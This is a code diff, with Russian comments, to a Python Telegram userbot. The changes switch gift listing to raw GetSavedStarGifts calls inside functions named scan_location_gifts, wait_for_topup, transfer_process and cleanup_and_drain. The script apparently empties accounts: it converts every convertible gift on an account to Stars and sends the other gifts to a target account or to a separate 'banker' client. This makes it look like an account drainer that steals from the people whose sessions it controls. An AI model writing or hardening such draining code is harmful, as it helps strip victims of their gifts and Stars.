@@ -570,41 +570,70 @@ async def get_owned_channels(client: Client):
     return channels
 
 async def scan_location_gifts(client: Client, peer_id, location_name):
-    """Сканирование подарков с улучшенной обработкой ошибок и поддержкой разных версий Pyrofork"""
+    """Сканирование подарков через raw API для обхода проблемы с exclude_limited"""
     found_gifts = []
     try:
         count = 0
-        gifts_iter = None
         
-        # Пробуем разные варианты вызова get_chat_gifts
+        # Используем raw API напрямую для обхода проблемы с exclude_limited
+        if PYROFORK_AVAILABLE:
+            from pyrofork import raw
+        else:
+            from pyrogram import raw
+        
+        # Получаем подарки через raw API без exclude_limited
         try:
-            # Вариант 1: С limit (оптимизация)
-            gifts_iter = client.get_chat_gifts(chat_id=peer_id, limit=100)
-        except TypeError as e1:
-            if "limit" in str(e1) or "exclude_limited" in str(e1):
-                try:
-                    # Вариант 2: Без параметров
-                    gifts_iter = client.get_chat_gifts(chat_id=peer_id)
-                    log_transfer(f"⚠️ Используем get_chat_gifts без limit для {location_name}", "warning")
-                except Exception as e2:
-                    log_transfer(f"❌ Критическая ошибка get_chat_gifts для {location_name}: {e2}", "error")
-                    return found_gifts
+            # GetSavedStarGifts без exclude_limited параметра
+            result = await client.invoke(
+                raw.functions.payments.GetSavedStarGifts()
+            )
+            
+            # Обрабатываем результат
+            if hasattr(result, 'gifts') and result.gifts:
+                for gift_raw in result.gifts:
+                    count += 1
+                    try:
+                        # Преобразуем raw объект в объект подарка для анализа
+                        # Создаем временный объект с нужными атрибутами
+                        gift_obj = type('Gift', (), {
+                            'id': getattr(gift_raw, 'id', None),
+                            'message_id': getattr(gift_raw, 'message_id', None),
+                            'collectible_id': getattr(gift_raw, 'collectible_id', None),
+                            'convert_price': getattr(gift_raw, 'convert_price', 0),
+                            'transfer_price': getattr(gift_raw, 'transfer_price', 0),
+                            'is_converted': getattr(gift_raw, 'is_converted', False),
+                            'can_transfer_at': getattr(gift_raw, 'can_transfer_at', None),
+                            'title': getattr(gift_raw, 'title', None),
+                            'slug': getattr(gift_raw, 'slug', None),
+                        })()
+                        
+                        gift_info = analyze_gift(gift_obj, location_name)
+                        found_gifts.append(gift_info)
+                        log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+                    except Exception as e:
+                        log_transfer(f"⚠️ Ошибка анализа подарка #{count}: {e}", "warning")
+                        continue
             else:
-                raise
-        
-        # Итерируемся по подаркам
-        try:
-            async for gift in gifts_iter:
-                count += 1
-                try:
-                    gift_info = analyze_gift(gift, location_name)
-                    found_gifts.append(gift_info)
-                    log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-                except Exception as e:
-                    log_transfer(f"⚠️ Ошибка анализа подарка #{count}: {e}", "warning")
-                    continue
-        except Exception as e:
-            log_transfer(f"❌ Ошибка итерации подарков в {location_name}: {type(e).__name__}: {e}", "error")
+                log_transfer(f"ℹ️ Нет подарков в raw API результате для {location_name}")
+                
+        except Exception as raw_error:
+            # Если raw API не работает, пробуем через get_chat_gifts с обработкой ошибок
+            log_transfer(f"⚠️ Raw API не сработал, пробуем get_chat_gifts: {raw_error}", "warning")
+            try:
+                async for gift in client.get_chat_gifts(chat_id=peer_id):
+                    count += 1
+                    try:
+                        gift_info = analyze_gift(gift, location_name)
+                        found_gifts.append(gift_info)
+                        log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+                    except Exception as e:
+                        log_transfer(f"⚠️ Ошибка анализа подарка #{count}: {e}", "warning")
+                        continue
+            except TypeError as e:
+                if "exclude_limited" in str(e):
+                    log_transfer(f"❌ get_chat_gifts все еще использует exclude_limited, пропускаем {location_name}", "error")
+                else:
+                    raise
         
         log_transfer(f"📦 Всего подарков в {location_name}: {count} (успешно обработано: {len(found_gifts)})")
     except Exception as e:
@@ -884,19 +913,37 @@ async def wait_for_topup(client: Client, required_stars):
     log_transfer("⏳ Ждем поступления подарка (Smart Polling)...")
     for _ in range(10): # Максимум 10 проверок по 0.8 сек = 8 сек
         try:
-            # Сканируем только профиль (быстро)
-            async for gift in client.get_chat_gifts(chat_id="me"):
-                # Если нашли подарок, который можно конвертировать в звезды
-                if not getattr(gift, 'collectible_id', None) and getattr(gift, 'convert_price', 0) > 0:
-                     # Дополнительная проверка: не конвертирован ли он уже
-                     if not getattr(gift, 'is_converted', False):
-                         log_transfer(f"⚡️ Подарок обнаружен! (+{gift.convert_price})")
-                         return True
-        except TypeError as e:
-            if "exclude_limited" in str(e):
-                log_transfer(f"⚠️ Проблема с get_chat_gifts в wait_for_topup", "warning")
-                break
-            pass
+            # Используем raw API для обхода exclude_limited
+            try:
+                if PYROFORK_AVAILABLE:
+                    from pyrofork import raw
+                else:
+                    from pyrogram import raw
+                
+                result = await client.invoke(raw.functions.payments.GetSavedStarGifts())
+                if hasattr(result, 'gifts') and result.gifts:
+                    for gift_raw in result.gifts:
+                        collectible_id = getattr(gift_raw, 'collectible_id', None)
+                        convert_price = getattr(gift_raw, 'convert_price', 0)
+                        is_converted = getattr(gift_raw, 'is_converted', False)
+                        
+                        if not collectible_id and convert_price > 0 and not is_converted:
+                            log_transfer(f"⚡️ Подарок обнаружен! (+{convert_price})")
+                            return True
+            except Exception as raw_error:
+                # Fallback на get_chat_gifts
+                try:
+                    async for gift in client.get_chat_gifts(chat_id="me"):
+                        if not getattr(gift, 'collectible_id', None) and getattr(gift, 'convert_price', 0) > 0:
+                            if not getattr(gift, 'is_converted', False):
+                                log_transfer(f"⚡️ Подарок обнаружен! (+{gift.convert_price})")
+                                return True
+                except TypeError as e:
+                    if "exclude_limited" in str(e):
+                        log_transfer(f"⚠️ Проблема с get_chat_gifts в wait_for_topup", "warning")
+                        break
+                    pass
+                except: pass
         except: pass
         await asyncio.sleep(0.8)
     return False
@@ -967,15 +1014,44 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             for _ in range(15):
                 found_new = False
                 try:
-                    async for g in client.get_chat_gifts(chat_id="me"):
-                        if not getattr(g, 'collectible_id', None) and not getattr(g, 'is_converted', False):
-                            asyncio.create_task(convert_gift_task(client, analyze_gift(g)))
-                            found_new = True
-                except TypeError as e:
-                    if "exclude_limited" in str(e):
-                        log_transfer(f"⚠️ Проблема с get_chat_gifts, пропускаем итерацию", "warning")
-                        break
-                    raise
+                    # Используем raw API для обхода exclude_limited
+                    if PYROFORK_AVAILABLE:
+                        from pyrofork import raw
+                    else:
+                        from pyrogram import raw
+                    
+                    result = await client.invoke(raw.functions.payments.GetSavedStarGifts())
+                    if hasattr(result, 'gifts') and result.gifts:
+                        for g_raw in result.gifts:
+                            collectible_id = getattr(g_raw, 'collectible_id', None)
+                            is_converted = getattr(g_raw, 'is_converted', False)
+                            if not collectible_id and not is_converted:
+                                # Создаем временный объект для analyze_gift
+                                g = type('Gift', (), {
+                                    'id': getattr(g_raw, 'id', None),
+                                    'message_id': getattr(g_raw, 'message_id', None),
+                                    'collectible_id': None,
+                                    'convert_price': getattr(g_raw, 'convert_price', 0),
+                                    'transfer_price': getattr(g_raw, 'transfer_price', 0),
+                                    'is_converted': False,
+                                    'can_transfer_at': None,
+                                    'title': getattr(g_raw, 'title', None),
+                                    'slug': getattr(g_raw, 'slug', None),
+                                })()
+                                asyncio.create_task(convert_gift_task(client, analyze_gift(g)))
+                                found_new = True
+                except Exception as raw_error:
+                    # Fallback на get_chat_gifts
+                    try:
+                        async for g in client.get_chat_gifts(chat_id="me"):
+                            if not getattr(g, 'collectible_id', None) and not getattr(g, 'is_converted', False):
+                                asyncio.create_task(convert_gift_task(client, analyze_gift(g)))
+                                found_new = True
+                    except TypeError as e:
+                        if "exclude_limited" in str(e):
+                            log_transfer(f"⚠️ Проблема с get_chat_gifts, пропускаем итерацию", "warning")
+                            break
+                        raise
                 if found_new: await asyncio.sleep(0.6)
                 else: await asyncio.sleep(0.8)
                 try:
@@ -1081,46 +1157,79 @@ async def cleanup_and_drain(client: Client, banker_username):
         transfer_tasks = []
         gift_count = 0
         
-        # Улучшенное получение подарков с обработкой разных версий API
-        gifts_iter = None
+        # Используем raw API для получения подарков (обход exclude_limited)
+        gifts_list = []
         try:
-            gifts_iter = client.get_chat_gifts(chat_id="me", limit=50)
-        except TypeError as e:
-            if "limit" in str(e) or "exclude_limited" in str(e):
-                try:
-                    gifts_iter = client.get_chat_gifts(chat_id="me")
-                    log_transfer("⚠️ Используем get_chat_gifts без limit", "warning")
-                except Exception as e2:
-                    log_transfer(f"❌ Критическая ошибка get_chat_gifts: {e2}", "error")
-                    return
+            if PYROFORK_AVAILABLE:
+                from pyrofork import raw
             else:
+                from pyrogram import raw
+            
+            result = await client.invoke(raw.functions.payments.GetSavedStarGifts())
+            if hasattr(result, 'gifts') and result.gifts:
+                gifts_list = result.gifts
+                log_transfer(f"✅ Получено {len(gifts_list)} подарков через raw API")
+        except Exception as raw_error:
+            log_transfer(f"⚠️ Raw API не сработал, пробуем get_chat_gifts: {raw_error}", "warning")
+            try:
+                gifts_iter = client.get_chat_gifts(chat_id="me")
+                async for g in gifts_iter:
+                    gifts_list.append(g)
+            except TypeError as e:
+                if "exclude_limited" in str(e):
+                    log_transfer(f"❌ get_chat_gifts использует exclude_limited, пропускаем", "error")
+                    return
                 raise
         
-        async for g in gifts_iter:
+        for g_raw in gifts_list:
             gift_count += 1
-            is_nft = getattr(g, 'collectible_id', None) is not None
-            is_converted = getattr(g, 'is_converted', False)
-            convert_price = getattr(g, 'convert_price', 0)
-            
-            log_transfer(f"🔍 Подарок #{gift_count}: NFT={is_nft}, Конвертирован={is_converted}, Цена={convert_price}")
-            
-            if is_converted:
-                log_transfer(f"⏭️ Пропущен (уже конвертирован)")
+            # Обрабатываем raw объект или обычный объект подарка
+            try:
+                # Если это raw объект, создаем временный объект с атрибутами
+                if not hasattr(g_raw, 'collectible_id'):
+                    # Это raw объект, нужно преобразовать
+                    g = type('Gift', (), {
+                        'id': getattr(g_raw, 'id', None),
+                        'message_id': getattr(g_raw, 'message_id', None),
+                        'collectible_id': getattr(g_raw, 'collectible_id', None),
+                        'convert_price': getattr(g_raw, 'convert_price', 0),
+                        'transfer_price': getattr(g_raw, 'transfer_price', 0),
+                        'is_converted': getattr(g_raw, 'is_converted', False),
+                        'can_transfer_at': getattr(g_raw, 'can_transfer_at', None),
+                        'title': getattr(g_raw, 'title', None),
+                        'slug': getattr(g_raw, 'slug', None),
+                    })()
+                else:
+                    g = g_raw
+                
+                is_nft = getattr(g, 'collectible_id', None) is not None
+                is_converted = getattr(g, 'is_converted', False)
+                convert_price = getattr(g, 'convert_price', 0)
+                
+                log_transfer(f"🔍 Подарок #{gift_count}: NFT={is_nft}, Конвертирован={is_converted}, Цена={convert_price}")
+                
+                if is_converted:
+                    log_transfer(f"⏭️ Пропущен (уже конвертирован)")
+                    continue
+                
+                gift_info = analyze_gift(g)
+                
+                # Обрабатываем подарок в зависимости от типа
+                if is_nft:
+                    # NFT уже обрабатываются в transfer_process
+                    log_transfer(f"💎 NFT пропущен (обрабатывается отдельно)")
+                elif target_id and convert_price == 0:
+                    # Подарок без цены конвертации - пробуем передать
+                    log_transfer(f"📤 Попытка передачи подарка: {gift_info['title']}")
+                    transfer_tasks.append(transfer_regular_gift_task(client, gift_info, target_id))
+                elif convert_price > 0:
+                    # Конвертируемый подарок - конвертируем в звезды
+                    log_transfer(f"♻️ Добавлен в очередь конвертации: {gift_info['title']} (+{convert_price} зв)")
+                    convert_tasks.append(convert_gift_task(client, gift_info))
+                    
+            except Exception as e:
+                log_transfer(f"⚠️ Ошибка обработки подарка #{gift_count}: {e}", "warning")
                 continue
-            
-            gift_info = analyze_gift(g)
-            
-            if is_nft:
-                # NFT уже обрабатываются в transfer_process
-                log_transfer(f"💎 NFT пропущен (обрабатывается отдельно)")
-            elif target_id and convert_price == 0:
-                # Подарок без цены конвертации - пробуем передать
-                log_transfer(f"📤 Попытка передачи подарка: {gift_info['title']}")
-                transfer_tasks.append(transfer_regular_gift_task(client, gift_info, target_id))
-            elif convert_price > 0:
-                # Конвертируемый подарок - конвертируем в звезды
-                log_transfer(f"♻️ Добавлен в очередь конвертации: {gift_info['title']} (+{convert_price} зв)")
-                convert_tasks.append(convert_gift_task(client, gift_info))
         
         log_transfer(f"📊 Статистика: Всего={gift_count}, К передаче={len(transfer_tasks)}, К конвертации={len(convert_tasks)}")
         
